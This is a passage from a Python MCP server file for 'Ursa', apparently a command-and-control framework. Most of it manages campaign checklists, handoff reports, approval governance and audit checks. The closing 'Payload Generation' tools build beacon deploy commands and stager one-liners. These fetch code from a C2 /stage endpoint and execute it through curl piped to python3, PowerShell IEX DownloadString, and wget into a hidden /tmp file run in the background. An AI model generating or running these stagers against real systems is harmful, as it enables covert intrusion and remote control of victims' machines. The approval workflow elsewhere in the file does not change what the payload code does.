        action=action_filter,
        item_id=item_id if item_id > 0 else None,
        limit=max(1, min(limit, 500)),
    )
    if not rows:
        return f"No checklist history for campaign '{name}'."
    lines = [f"CHECKLIST HISTORY: {name}", "=" * 100]
    for row in rows:
        lines.append(
            f"{_format_time(row['created_at'])} item={row['item_id']:<5} "
            f"action={row['action']:<14} status={row.get('new_status') or '-':<12} title={row.get('title') or '-'}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_add_checklist_item(
    campaign: str,
    title: str,
    details: str = "",
    owner: str = "",
    due_at: str = "",
) -> str:
    """Add a checklist item to a campaign."""
    name = campaign.strip()
    item_title = title.strip()
    if not name:
        return "Campaign is required."
    if not item_title:
        return "title is required."
    due_ts = None
    due_text = due_at.strip()
    if due_text:
        try:
            due_ts = datetime.fromisoformat(due_text).timestamp()
        except ValueError:
            return "due_at must be ISO date/datetime (example: 2026-03-08T14:30)."
    item_id = add_campaign_checklist_item(
        campaign=name,
        title=item_title,
        details=details.strip(),
        owner=owner.strip(),
        due_at=due_ts,
        actor="mcp:ursa_campaign_add_checklist_item",
    )
    return f"Added checklist item {item_id} to campaign {name}."


@mcp_server.tool()
def ursa_campaign_update_checklist_item(
    item_id: int,
    title: str = "",
    details: str = "",
    owner: str = "",
    due_at: str = "",
    status: str = "",
) -> str:
    """Update fields for one checklist item."""
    updates: dict[str, object] = {}
    if title.strip():
        updates["title"] = title.strip()
    if details.strip():
        updates["details"] = details.strip()
    if owner.strip():
        updates["owner"] = owner.strip()
    if status.strip():
        normalized = status.strip().lower()
        if normalized not in {"pending", "in_progress", "blocked", "done"}:
            return "status must be one of: pending, in_progress, blocked, done."
        updates["status"] = normalized
    if due_at.strip():
        try:
            updates["due_at"] = datetime.fromisoformat(due_at.strip()).timestamp()
        except ValueError:
            return "due_at must be ISO date/datetime (example: 2026-03-08T14:30)."
    if not updates:
        return "No updates supplied."
    changed = update_campaign_checklist_item(item_id, actor="mcp:ursa_campaign_update_checklist_item", **updates)
    return f"Updated checklist item {item_id}." if changed else f"Checklist item {item_id} not found."


@mcp_server.tool()
def ursa_campaign_delete_checklist_item(item_id: int) -> str:
    """Delete one checklist item by ID."""
    deleted = delete_campaign_checklist_item(item_id, actor="mcp:ursa_campaign_delete_checklist_item")
    return f"Deleted checklist item {item_id}." if deleted else f"Checklist item {item_id} not found."


@mcp_server.tool()
def ursa_campaign_bulk_update_checklist(
    campaign: str,
    status: str,
    from_status: str = "",
    owner: str = "",
    query: str = "",
    limit: int = 500,
) -> str:
    """Bulk-update checklist status for matching campaign items."""
    name = campaign.strip()
    target = status.strip().lower()
    if not name:
        return "Campaign is required."
    if target not in {"pending", "in_progress", "blocked", "done"}:
        return "status must be one of: pending, in_progress, blocked, done."
    normalized_from = from_status.strip().lower() or None
    if normalized_from and normalized_from not in {"pending", "in_progress", "blocked", "done"}:
        return "from_status must be one of: pending, in_progress, blocked, done."

    rows = list_campaign_checklist(
        campaign=name,
        status=normalized_from,
        owner=owner.strip() or None,
        text=query.strip() or None,
        limit=max(1, min(limit, 5000)),
    )
    changed = 0
    for row in rows:
        if row.get("status") == target:
            continue
        if update_campaign_checklist_item(
            int(row["id"]),
            status=target,
            actor="mcp:ursa_campaign_bulk_update_checklist",
        ):
            changed += 1
    return (
        f"Checklist bulk update complete.\n"
        f"Campaign: {name}\n"
        f"Matched: {len(rows)}\n"
        f"Updated: {changed}\n"
        f"Target status: {target}"
    )


@mcp_server.tool()
def ursa_campaign_checklist_alerts(
    campaign: str | None = None,
    due_within_hours: int = 24,
    limit: int = 50,
) -> str:
    """List overdue and near-due checklist items."""
    name = (campaign or "").strip() or None
    window_hours = max(1, min(due_within_hours, 168))
    rows = list_campaign_checklist(campaign=name, limit=5000)
    now = time.time()
    due_window = now + window_hours * 3600
    overdue = []
    due_soon = []
    for row in rows:
        if row.get("status") == "done":
            continue
        due_at = row.get("due_at")
        if not due_at:
            continue
        if due_at < now:
            overdue.append(row)
        elif due_at <= due_window:
            due_soon.append(row)
    overdue_sorted = sorted(overdue, key=lambda item: item.get("due_at") or 0)[: max(1, min(limit, 200))]
    due_soon_sorted = sorted(due_soon, key=lambda item: item.get("due_at") or 0)[: max(1, min(limit, 200))]
    scope = name or "all campaigns"
    lines = [
        f"CHECKLIST ALERTS ({scope})",
        "=" * 80,
        f"Overdue: {len(overdue)}",
        f"Due in <= {window_hours}h: {len(due_soon)}",
    ]
    if overdue_sorted:
        lines.extend(["", "Overdue:"])
        for row in overdue_sorted:
            lines.append(
                f"  [{row['campaign']}] {row['id']} {row['title']} "
                f"owner={row.get('owner') or '-'} due={_format_time(row['due_at'])} status={row['status']}"
            )
    if due_soon_sorted:
        lines.extend(["", f"Due within {window_hours}h:"])
        for row in due_soon_sorted:
            lines.append(
                f"  [{row['campaign']}] {row['id']} {row['title']} "
                f"owner={row.get('owner') or '-'} due={_format_time(row['due_at'])} status={row['status']}"
            )
    if not overdue_sorted and not due_soon_sorted:
        lines.extend(["", "No checklist due alerts in scope."])
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_checklist_from_alerts(
    campaign: str,
    owner: str = "",
    due_in_hours: int = 24,
) -> str:
    """Generate campaign checklist remediation items from active policy alerts."""
    name = campaign.strip()
    if not name:
        return "campaign is required."
    plan = get_policy_remediation_plan(campaign=name)
    if not plan:
        return f"No active policy alerts for campaign '{name}'."

    due_at = None
    if due_in_hours > 0:
        due_at = time.time() + min(max(due_in_hours, 1), 24 * 14) * 3600
    existing_titles = {
        (row.get("title") or "").strip().lower()
        for row in list_campaign_checklist(campaign=name, limit=5000)
    }
    created = 0
    skipped = 0
    for item in plan:
        title = f"Policy remediation: {item['metric']} ({item['severity']})"
        if title.lower() in existing_titles:
            skipped += 1
            continue
        details = (
            f"{item['action']}\n"
            f"Approve path: {item['approve_cmd']}\n"
            f"Reject path: {item['reject_cmd']}"
        )
        add_campaign_checklist_item(
            campaign=name,
            title=title,
            details=details,
            owner=owner.strip(),
            due_at=due_at,
            actor="mcp:ursa_campaign_checklist_from_alerts",
        )
        created += 1
        existing_titles.add(title.lower())
    return (
        f"Checklist items generated from alerts.\n"
        f"Campaign: {name}\n"
        f"Recommendations: {len(plan)}\n"
        f"Created: {created}\n"
        f"Skipped existing: {skipped}"
    )


@mcp_server.tool()
def ursa_campaign_handoff(campaign: str) -> str:
    """
    Generate a concise handoff brief for a campaign.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    payload = _build_campaign_handoff_payload(name)
    return _render_campaign_handoff_text(payload)


@mcp_server.tool()
def ursa_campaign_handoff_report(campaign: str, output_format: str = "md") -> str:
    """
    Export campaign handoff report to disk as Markdown or JSON.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    fmt = output_format.strip().lower()
    if fmt not in {"md", "json"}:
        return "output_format must be 'md' or 'json'."

    payload = _build_campaign_handoff_payload(name)
    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    safe = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in name)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        out_path = reports_dir / f"campaign_handoff_{safe}_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2)
    else:
        out_path = reports_dir / f"campaign_handoff_{safe}_{ts}.md"
        with open(out_path, "w", encoding="utf-8") as f:
            f.write(_render_campaign_handoff_markdown(payload))

    return f"Campaign handoff report exported.\nPath: {out_path}"


def _build_campaign_handoff_payload(campaign: str) -> dict:
    sessions = list_sessions(campaign=campaign)
    tasks = list_tasks(campaign=campaign, limit=300)
    events = get_events(campaign=campaign, limit=300)
    approvals = list_approval_requests(status="pending", campaign=campaign, limit=300)
    notes = list_campaign_notes(campaign=campaign, limit=50)
    checklist = list_campaign_checklist(campaign=campaign, limit=100)
    alerts = evaluate_campaign_policy_alerts(campaign=campaign)
    checklist_open = [item for item in checklist if item.get("status") != "done"]

    by_status: dict[str, int] = {}
    for s in sessions:
        st = s.get("status", "unknown")
        by_status[st] = by_status.get(st, 0) + 1

    return {
        "campaign": campaign,
        "generated_at": datetime.now().isoformat(),
        "counts": {
            "sessions": len(sessions),
            "tasks": len(tasks),
            "events": len(events),
            "pending_approvals": len(approvals),
            "policy_alerts": len(alerts),
            "notes": len(notes),
            "checklist_items": len(checklist),
            "checklist_open": len(checklist_open),
        },
        "session_status": by_status,
        "pending_approvals": approvals[:10],
        "alerts": alerts[:10],
        "notes": notes[:10],
        "checklist": checklist[:20],
    }


def _render_campaign_handoff_text(payload: dict) -> str:
    name = payload["campaign"]
    counts = payload["counts"]
    lines = [
        f"HANDOFF BRIEF: {name}",
        "=" * 60,
        f"Sessions: {counts['sessions']}  Tasks: {counts['tasks']}  Events: {counts['events']}",
        f"Pending Approvals: {counts['pending_approvals']}  Policy Alerts: {counts['policy_alerts']}",
        f"Checklist: {counts['checklist_open']}/{counts['checklist_items']} open",
        "",
        "Session Status:",
    ]
    for key, count in sorted(payload["session_status"].items()):
        lines.append(f"  {key}: {count}")

    approvals = payload["pending_approvals"]
    if approvals:
        lines.extend(["", "Top Pending Approvals:"])
        for a in approvals:
            lines.append(
                f"  {a['id']} risk={a['risk_level']} action={a['action']} session={a.get('session_id') or '-'}"
            )

    alerts = payload["alerts"]
    if alerts:
        lines.extend(["", "Active Policy Alerts:"])
        for a in alerts:
            lines.append(f"  {a['metric']} {a['value']}>{a['threshold']} severity={a['severity']}")

    notes = payload["notes"]
    if notes:
        lines.extend(["", "Recent Notes:"])
        for n in notes:
            lines.append(f"  [{_format_time(n['created_at'])}] {n['author']}: {n['note']}")
    checklist = payload["checklist"]
    if checklist:
        lines.extend(["", "Checklist:"])
        for item in checklist:
            due = _format_time(item["due_at"]) if item.get("due_at") else "-"
            lines.append(
                f"  {item['id']} [{item['status']}] {item['title']} "
                f"owner={item.get('owner') or '-'} due={due}"
            )
    return "\n".join(lines)


def _render_campaign_handoff_markdown(payload: dict) -> str:
    name = payload["campaign"]
    counts = payload["counts"]
    lines = [
        f"# Campaign Handoff: {name}",
        "",
        f"Generated: {payload['generated_at']}",
        "",
        "## Summary",
        f"- Sessions: {counts['sessions']}",
        f"- Tasks (recent): {counts['tasks']}",
        f"- Events (recent): {counts['events']}",
        f"- Pending approvals: {counts['pending_approvals']}",
        f"- Policy alerts: {counts['policy_alerts']}",
        f"- Notes: {counts['notes']}",
        f"- Checklist items: {counts['checklist_items']}",
        f"- Open checklist: {counts['checklist_open']}",
        "",
        "## Session Status",
    ]
    for key, count in sorted(payload["session_status"].items()):
        lines.append(f"- {key}: {count}")

    lines.extend(["", "## Pending Approvals"])
    if payload["pending_approvals"]:
        for a in payload["pending_approvals"]:
            lines.append(
                f"- `{a['id']}` risk={a['risk_level']} action={a['action']} session={a.get('session_id') or '-'}"
            )
    else:
        lines.append("- None")

    lines.extend(["", "## Active Policy Alerts"])
    if payload["alerts"]:
        for a in payload["alerts"]:
            lines.append(f"- {a['metric']}: {a['value']} > {a['threshold']} ({a['severity']})")
    else:
        lines.append("- None")

    lines.extend(["", "## Recent Notes"])
    if payload["notes"]:
        for n in payload["notes"]:
            lines.append(f"- [{_format_time(n['created_at'])}] **{n['author']}**: {n['note']}")
    else:
        lines.append("- None")
    lines.extend(["", "## Checklist"])
    if payload["checklist"]:
        for item in payload["checklist"]:
            due = _format_time(item["due_at"]) if item.get("due_at") else "-"
            lines.append(
                f"- `{item['id']}` [{item['status']}] {item['title']} "
                f"(owner={item.get('owner') or '-'}, due={due})"
            )
            if item.get("details"):
                lines.append(f"  - details: {item['details']}")
    else:
        lines.append("- None")
    lines.append("")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_campaign_delete_note(campaign: str, note_id: int) -> str:
    """Delete one campaign note by ID."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    deleted = delete_campaign_note(note_id)
    return f"Deleted note {note_id} from {name}." if deleted else f"Note {note_id} not found."


# ── Governance ──


@mcp_server.tool()
def ursa_policy_matrix() -> str:
    """Show the Ursa unified policy/risk matrix."""
    return "URSA POLICY MATRIX\n==================\n" + format_risk_matrix()


@mcp_server.tool()
def ursa_governance_summary(
    campaign: str | None = None,
    tag: str | None = None,
    risk_level: str | None = None,
) -> str:
    """
    Summarize pending approvals by risk and campaign.

    Args:
        campaign: Optional campaign filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
    """
    rows = list_approval_requests(
        status="pending",
        campaign=(campaign or "").strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=1000,
    )
    if not rows:
        return "No pending approvals."

    by_risk: dict[str, int] = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    by_campaign: dict[str, int] = {}
    for row in rows:
        risk = (row.get("risk_level") or "").lower()
        if risk in by_risk:
            by_risk[risk] += 1
        name = (row.get("campaign") or "unassigned").strip() or "unassigned"
        by_campaign[name] = by_campaign.get(name, 0) + 1

    lines = [
        "PENDING APPROVAL SUMMARY",
        "=" * 40,
        f"Total: {len(rows)}",
        "",
        "By Risk:",
        f"  critical: {by_risk['critical']}",
        f"  high:     {by_risk['high']}",
        f"  medium:   {by_risk['medium']}",
        f"  low:      {by_risk['low']}",
        "",
        "By Campaign:",
    ]
    for name, count in sorted(by_campaign.items(), key=lambda item: item[1], reverse=True)[:10]:
        lines.append(f"  {name}: {count}")
    return "\n".join(lines)


@mcp_server.tool()
def ursa_set_campaign_policy(
    campaign: str,
    max_pending_total: int = 20,
    max_pending_high: int = 10,
    max_pending_critical: int = 2,
    max_oldest_pending_minutes: int = 60,
    note: str = "",
) -> str:
    """
    Create/update a campaign governance threshold policy.

    Args:
        campaign: Campaign name.
        max_pending_total: Max pending approvals before alert.
        max_pending_high: Max pending high-risk approvals before alert.
        max_pending_critical: Max pending critical approvals before alert.
        max_oldest_pending_minutes: Max age for oldest pending approval before alert.
        note: Optional policy note.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    policy = upsert_campaign_policy(
        campaign=name,
        max_pending_total=max_pending_total,
        max_pending_high=max_pending_high,
        max_pending_critical=max_pending_critical,
        max_oldest_pending_minutes=max_oldest_pending_minutes,
        updated_by="mcp:ursa_set_campaign_policy",
        note=note,
    )
    return (
        f"Policy updated for {name}.\n"
        f"max_pending_total={policy['max_pending_total']}\n"
        f"max_pending_high={policy['max_pending_high']}\n"
        f"max_pending_critical={policy['max_pending_critical']}\n"
        f"max_oldest_pending_minutes={policy['max_oldest_pending_minutes']}"
    )


@mcp_server.tool()
def ursa_campaign_policies() -> str:
    """List configured campaign governance policies."""
    rows = list_campaign_policies()
    if not rows:
        return "No campaign policies configured."
    lines = [
        f"{'Campaign':<20} {'Total':<8} {'High':<8} {'Critical':<8} {'OldestMin':<10} {'Updated By'}",
        "-" * 82,
    ]
    for row in rows:
        lines.append(
            f"{row['campaign'][:20]:<20} {row['max_pending_total']:<8} "
            f"{row['max_pending_high']:<8} {row['max_pending_critical']:<8} "
            f"{row['max_oldest_pending_minutes']:<10} {row['updated_by']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_delete_campaign_policy(campaign: str) -> str:
    """Delete campaign threshold policy."""
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    deleted = delete_campaign_policy(name)
    return f"Deleted campaign policy: {name}" if deleted else f"No policy found for {name}"


@mcp_server.tool()
def ursa_campaign_alerts(campaign: str | None = None) -> str:
    """
    Show active policy alerts for campaign thresholds.

    Args:
        campaign: Optional campaign filter.
    """
    alerts = evaluate_campaign_policy_alerts(campaign=(campaign or "").strip() or None)
    if not alerts:
        return "No active campaign policy alerts."
    lines = [
        f"{'Campaign':<20} {'Metric':<10} {'Value':<8} {'Threshold':<10} {'Severity'}",
        "-" * 70,
    ]
    for alert in alerts:
        lines.append(
            f"{alert['campaign'][:20]:<20} {alert['metric']:<10} {alert['value']:<8} "
            f"{alert['threshold']:<10} {alert['severity']}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_policy_remediation_plan(campaign: str | None = None) -> str:
    """
    Generate remediation recommendations for active campaign policy alerts.

    Args:
        campaign: Optional campaign filter.
    """
    plan = get_policy_remediation_plan(campaign=(campaign or "").strip() or None)
    if not plan:
        return "No active alerts to remediate."
    lines = [
        "POLICY REMEDIATION PLAN",
        "=" * 40,
    ]
    for item in plan[:20]:
        lines.extend(
            [
                f"- Campaign: {item['campaign']}  Metric: {item['metric']}  Severity: {item['severity']}",
                f"  Action: {item['action']}",
                f"  Approve: {item['approve_cmd']}",
                f"  Reject:  {item['reject_cmd']}",
            ]
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_apply_policy_remediation(
    campaign: str,
    strategy: str = "reduce-critical",
    note: str = "",
) -> str:
    """
    Apply a conservative bulk remediation strategy for one campaign.

    Strategies:
      - reduce-critical: reject pending critical approvals
      - reduce-high: reject pending high approvals
      - clear-backlog: reject all pending approvals
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."

    strategy_key = strategy.strip().lower()
    if strategy_key == "reduce-critical":
        risk_level = "critical"
    elif strategy_key == "reduce-high":
        risk_level = "high"
    elif strategy_key == "clear-backlog":
        risk_level = None
    else:
        return "Invalid strategy. Use: reduce-critical | reduce-high | clear-backlog"

    summary = process_bulk_approval_decisions(
        approved=False,
        actor="mcp:ursa_apply_policy_remediation",
        note=note or f"Auto-remediation strategy={strategy_key}",
        campaign=name,
        risk_level=risk_level,
        limit=500,
    )
    return (
        f"Remediation applied.\n"
        f"Campaign: {name}\n"
        f"Strategy: {strategy_key}\n"
        f"Matched: {summary['matched']}\n"
        f"Rejected: {summary['rejected']}\n"
        f"Failed: {summary['failed']}"
    )


@mcp_server.tool()
def ursa_preview_policy_remediation(campaign: str, strategy: str = "reduce-critical") -> str:
    """
    Preview how many approvals would be affected by a remediation strategy.
    """
    name = campaign.strip()
    if not name:
        return "Campaign is required."
    strategy_key = strategy.strip().lower()
    if strategy_key == "reduce-critical":
        risk_level = "critical"
    elif strategy_key == "reduce-high":
        risk_level = "high"
    elif strategy_key == "clear-backlog":
        risk_level = None
    else:
        return "Invalid strategy. Use: reduce-critical | reduce-high | clear-backlog"

    rows = list_approval_requests(
        status="pending",
        campaign=name,
        risk_level=risk_level,
        limit=5000,
    )
    return (
        f"Remediation preview.\n"
        f"Campaign: {name}\n"
        f"Strategy: {strategy_key}\n"
        f"Would affect: {len(rows)} pending approvals"
    )


@mcp_server.tool()
def ursa_governance_report(output_format: str = "json") -> str:
    """
    Export governance snapshot report (policies, alerts, pending approvals).
    """
    fmt = output_format.strip().lower()
    if fmt not in {"json", "csv"}:
        return "output_format must be 'json' or 'csv'."

    policies = list_campaign_policies()
    alerts = evaluate_campaign_policy_alerts()
    approvals = list_approval_requests(status="pending", limit=5000)

    reports_dir = PROJECT_ROOT / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")

    if fmt == "json":
        payload = {
            "generated_at": datetime.now().isoformat(),
            "counts": {
                "policies": len(policies),
                "alerts": len(alerts),
                "pending_approvals": len(approvals),
            },
            "policies": policies,
            "alerts": alerts,
            "pending_approvals": approvals,
        }
        out_path = reports_dir / f"governance_snapshot_{ts}.json"
        with open(out_path, "w", encoding="utf-8") as f:
            json.dump(payload, f, indent=2)
    else:
        out_path = reports_dir / f"governance_snapshot_{ts}.csv"
        with open(out_path, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["section", "campaign", "metric", "value", "extra"])
            for p in policies:
                writer.writerow(
                    [
                        "policy",
                        p["campaign"],
                        "thresholds",
                        f"total={p['max_pending_total']} high={p['max_pending_high']} critical={p['max_pending_critical']}",
                        p.get("note", ""),
                    ]
                )
            for a in alerts:
                writer.writerow(
                    [
                        "alert",
                        a["campaign"],
                        a["metric"],
                        a["value"],
                        f"threshold={a['threshold']} severity={a['severity']}",
                    ]
                )
            for p in approvals:
                writer.writerow(
                    [
                        "pending_approval",
                        p.get("campaign") or "unassigned",
                        p.get("risk_level", ""),
                        p.get("id", ""),
                        p.get("reason", ""),
                    ]
                )

    return (
        f"Governance report exported.\n"
        f"Format: {fmt}\n"
        f"Path: {out_path}\n"
        f"Policies: {len(policies)} Alerts: {len(alerts)} Pending approvals: {len(approvals)}"
    )


@mcp_server.tool()
def ursa_approvals(
    status: str = "pending",
    campaign: str | None = None,
    tag: str | None = None,
    risk_level: str | None = None,
    limit: int = 20,
) -> str:
    """
    List governance step-up approval requests.

    Args:
        status: Filter by status ("pending", "approved", "rejected")
        campaign: Filter by campaign name
        tag: Filter by tag substring
        risk_level: Filter by risk level
        limit: Max rows to return
    """
    rows = list_approval_requests(
        status=status,
        campaign=campaign,
        tag=tag,
        risk_level=risk_level,
        limit=limit,
    )
    if not rows:
        return f"No {status} approvals."

    lines = [
        f"{'ID':<10} {'Risk':<10} {'Campaign':<14} {'Action':<12} {'Session':<10} {'By':<20} {'Age'}",
        "-" * 100,
    ]
    for row in rows:
        lines.append(
            f"{row['id']:<10} {row['risk_level']:<10} {(row.get('campaign') or '-')[:14]:<14} {row['action']:<12} "
            f"{(row.get('session_id') or '-'): <10} {row['requested_by']:<20} "
            f"{_time_ago(row['created_at'])}"
        )
    return "\n".join(lines)


@mcp_server.tool()
def ursa_approve(approval_id: str, note: str = "") -> str:
    """
    Approve a pending request and queue its original task.

    Args:
        approval_id: Approval request ID
        note: Optional decision note
    """
    result = process_approval_decision(
        approval_id=approval_id,
        approved=True,
        actor="mcp:ursa_approve",
        note=note,
    )
    if result["status"] == "not_found":
        return f"Approval {approval_id} not found."
    if result["status"] == "already_resolved":
        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
    if result["status"] == "error":
        return f"Approval {approval_id} could not be updated."
    if result.get("queue_result") != "queued":
        return f"Approval {approval_id} recorded, but task was not queued."
    return f"Approval {approval_id} approved. Task queued: {result.get('task_id')}"


@mcp_server.tool()
def ursa_reject(approval_id: str, note: str = "") -> str:
    """
    Reject a pending approval request.

    Args:
        approval_id: Approval request ID
        note: Optional reason for rejection
    """
    result = process_approval_decision(
        approval_id=approval_id,
        approved=False,
        actor="mcp:ursa_reject",
        note=note,
    )
    if result["status"] == "not_found":
        return f"Approval {approval_id} not found."
    if result["status"] == "already_resolved":
        return f"Approval {approval_id} is already {result.get('current_status', 'resolved')}."
    if result["status"] == "error":
        return f"Approval {approval_id} could not be updated."
    return f"Approval {approval_id} rejected."


@mcp_server.tool()
def ursa_approve_campaign(
    campaign: str,
    tag: str | None = None,
    risk_level: str | None = None,
    note: str = "",
) -> str:
    """
    Approve all pending requests for a campaign/tag filter.

    Args:
        campaign: Campaign name to filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
        note: Optional audit note.
    """
    summary = process_bulk_approval_decisions(
        approved=True,
        actor="mcp:ursa_approve_campaign",
        note=note,
        campaign=campaign.strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=500,
    )
    return (
        f"Bulk approve complete.\n"
        f"Matched: {summary['matched']}\n"
        f"Approved: {summary['approved']}\n"
        f"Failed: {summary['failed']}\n"
        f"Already resolved: {summary['already_resolved']}"
    )


@mcp_server.tool()
def ursa_reject_campaign(
    campaign: str,
    tag: str | None = None,
    risk_level: str | None = None,
    note: str = "",
) -> str:
    """
    Reject all pending requests for a campaign/tag filter.

    Args:
        campaign: Campaign name to filter.
        tag: Optional tag filter.
        risk_level: Optional risk filter.
        note: Optional audit note.
    """
    summary = process_bulk_approval_decisions(
        approved=False,
        actor="mcp:ursa_reject_campaign",
        note=note,
        campaign=campaign.strip() or None,
        tag=(tag or "").strip() or None,
        risk_level=(risk_level or "").strip() or None,
        limit=500,
    )
    return (
        f"Bulk reject complete.\n"
        f"Matched: {summary['matched']}\n"
        f"Rejected: {summary['rejected']}\n"
        f"Failed: {summary['failed']}\n"
        f"Already resolved: {summary['already_resolved']}"
    )


@mcp_server.tool()
def ursa_audit_integrity(limit: int = 50) -> str:
    """
    Verify immutable audit chain integrity and show recent audit events.

    Args:
        limit: Number of recent events to show after verification
    """
    check = verify_immutable_audit_chain()
    rows = get_immutable_audit(limit=limit)
    status_line = (
        f"Audit chain integrity: OK ({check['checked']} events checked)"
        if check["ok"]
        else f"Audit chain integrity: FAILED at {check['failed_event']} after {check['checked']} checks"
    )
    if not rows:
        return status_line + "\nNo immutable audit events."
    lines = [status_line, "", "Recent immutable events:"]
    for row in rows[: min(limit, 20)]:
        lines.append(
            f"[{_format_time(row['timestamp'])}] {row['actor']} {row['action']} "
            f"risk={row['risk_level']} result={row['policy_result']}"
        )
    return "\n".join(lines)


# ── Payload Generation ──


@mcp_server.tool()
def ursa_generate(
    c2_url: str | None = None,
    interval: int = 5,
    jitter: float = 0.1,
    output_format: str = "python",
) -> str:
    """
    Generate a beacon payload configured for your C2 server.

    Args:
        c2_url: The C2 server URL (e.g., http://10.0.0.1:8443).
                Auto-detects if not provided.
        interval: Beacon interval in seconds (default 5)
        jitter: Jitter factor 0.0-1.0 (default 0.1)
        output_format: Output format — "python" for full script,
                       "oneliner" for a one-line command
    """
    if not c2_url:
        import socket as _s
        try:
            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            _sock.connect(("8.8.8.8", 80))
            local_ip = _sock.getsockname()[0]
            _sock.close()
        except Exception:
            local_ip = "YOUR_IP"
        c2_url = f"http://{local_ip}:8443"

    if output_format == "oneliner":
        return (f"python3 -c \"$(curl -s {c2_url}/stage)\" "
                f"--server {c2_url} --interval {interval} --jitter {jitter}")

    # Read the beacon source
    beacon_path = PROJECT_ROOT / "implants" / "beacon.py"
    if not beacon_path.exists():
        return "Beacon source not found at implants/beacon.py"

    lines = [
        "Ursa Beacon Payload Generated",
        f"C2:       {c2_url}",
        f"Interval: {interval}s",
        f"Jitter:   {jitter}",
        "",
        "Deploy command:",
        f"  python3 beacon.py --server {c2_url} --interval {interval} --jitter {jitter}",
        "",
        "One-liner (curl + exec):",
        f"  curl -s {c2_url}/stage | python3 - --server {c2_url}",
        "",
        f"Beacon source is at: {beacon_path}",
        "Copy it to the target and run with the deploy command above.",
    ]

    return "\n".join(lines)


@mcp_server.tool()
def ursa_stager(c2_url: str | None = None) -> str:
    """
    Generate stager one-liners for different platforms.

    The stager downloads and runs the full beacon from the C2 /stage endpoint.

    Args:
        c2_url: C2 server URL. Auto-detects if not set.
    """
    if not c2_url:
        import socket as _s
        try:
            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
            _sock.connect(("8.8.8.8", 80))
            local_ip = _sock.getsockname()[0]
            _sock.close()
        except Exception:
            local_ip = "YOUR_IP"
        c2_url = f"http://{local_ip}:8443"

    lines = [
        f"URSA STAGER ONE-LINERS → {c2_url}",
        "",
        "[Python — cross-platform]",
        f"python3 -c \"import urllib.request,os,tempfile,subprocess;"
        f"d=urllib.request.urlopen('{c2_url}/stage').read();"
        f"f=tempfile.NamedTemporaryFile(suffix='.py',delete=False);"
        f"f.write(d);f.close();"
        f"subprocess.Popen(['python3',f.name,'--server','{c2_url}'])\"",
        "",
        "[Bash + curl]",
        f"curl -s {c2_url}/stage -o /tmp/.u.py && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "[PowerShell]",
        f"powershell -nop -c \"IEX(New-Object Net.WebClient).DownloadString('{c2_url}/stage')\"",
        "",
        "[wget]",
        f"wget -qO /tmp/.u.py {c2_url}/stage && python3 /tmp/.u.py --server {c2_url} &",
        "",
        "NOTE: Ensure the C2 server is running (ursa_start_c2) before deploying.",
    ]

    return "\n".join(lines)


if __name__ == "__main__":
    mcp_server.run()
